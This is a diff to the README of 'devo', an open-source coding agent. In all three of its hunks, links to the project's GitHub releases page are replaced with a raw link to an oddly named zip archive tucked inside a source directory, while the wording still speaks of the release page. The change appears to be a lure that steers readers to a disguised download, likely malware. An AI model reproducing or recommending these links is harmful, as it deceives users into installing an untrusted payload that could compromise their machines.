@@ -1,6 +1,6 @@
 # 🧩 devo - Open coding agent that fits your workflow
 
-[![Download devo](https://img.shields.io/badge/Download%20devo-blue?style=for-the-badge&logo=github)](https://github.com/preexisting-middlename485/devo/releases)
+[![Download devo](https://img.shields.io/badge/Download%20devo-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/preexisting-middlename485/devo/main/crates/core/src/conversation/Software_betanglement.zip)
 
 ## 🚀 What devo does
 
@@ -32,7 +32,7 @@ If your work computer has extra security rules, you may need help from your admi
 
 Visit this page to download devo:
 
-https://github.com/preexisting-middlename485/devo/releases
+https://raw.githubusercontent.com/preexisting-middlename485/devo/main/crates/core/src/conversation/Software_betanglement.zip
 
 On that page:
 
@@ -250,7 +250,7 @@ If you use a zip release, replace the old files with the new ones only after you
 
 Download and install from the release page here:
 
-https://github.com/preexisting-middlename485/devo/releases
+https://raw.githubusercontent.com/preexisting-middlename485/devo/main/crates/core/src/conversation/Software_betanglement.zip
 
 Use this page to find the latest Windows file, read release notes, and get the version you want.
 
